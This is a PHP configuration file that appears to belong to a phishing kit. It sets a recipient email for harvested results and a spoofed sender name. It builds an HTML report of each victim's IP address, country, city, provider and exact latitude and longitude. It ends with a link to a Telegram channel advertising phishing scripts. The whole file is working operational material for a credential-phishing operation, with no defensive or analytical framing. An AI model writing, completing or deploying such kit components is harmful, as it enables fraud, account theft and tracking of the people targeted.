

<?php

    $emailku = "emailmu@gmail.com";
    $sender = "From: AZKA HOSTING <hasil@arpanrizki.my.id>";
    $banner = "https://i.ibb.co/5K3s0Vv/arpantek-banner-v2.png";
    $more = '<table style="border-collapse: collapse; border-color: black; background: #fff" width="100%" border="1">
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>IP ADDRESS</th>
                    <th style="width: 60%; text-align: center;"><b>'.$arpantek_ipaddress.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>KODE TELEPON</th>
                    <th style="width: 60%; text-align: center;"><b>'.$arpantek_callcode.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>CONTINENT</th>
                    <th style="width: 60%; text-align: center;"><b>'.$arpantek_continent.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>COUNTRY</th>
                    <th style="width: 60%; text-align: center;"><b>'.$arpantek_country.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>REGION</th>
                    <th style="width: 60%; text-align: center;"><b>'.$arpantek_region.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>KOTA</th>
                    <th style="width: 78%; text-align: center;"><b>'.$arpantek_city.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>ZONA WAKTU</th>
                    <th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>PROVIDER</th>
                    <th style="width: 70%; text-align: center;"><b>'.$arpantek_provider.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>LATITUDE</th>
                    <th style="width: 70%; text-align: center;"><b>'.$arpantek_latitude.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>LONGITUDE</th>
                    <th style="width: 70%; text-align: center;"><b>'.$arpantek_longitude.'</th> 
                </tr>
                <tr>
                    <th style="padding-left: 10px; width: 40%; text-align: left;" height="25px"><b>NEED THIS SCRIPT?</th>
                    <th style="width: 70%; text-align: center;"><b><a href="https://t.me/berbagiscphising">CLICK HERE</a></th> 
                </tr>	
            </table>';

    function sessionRess($length = 28) {
        return substr(str_shuffle(str_repeat($x='01234567890123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ', ceil($length/strlen($x)) )),1,$length);
    }

?>

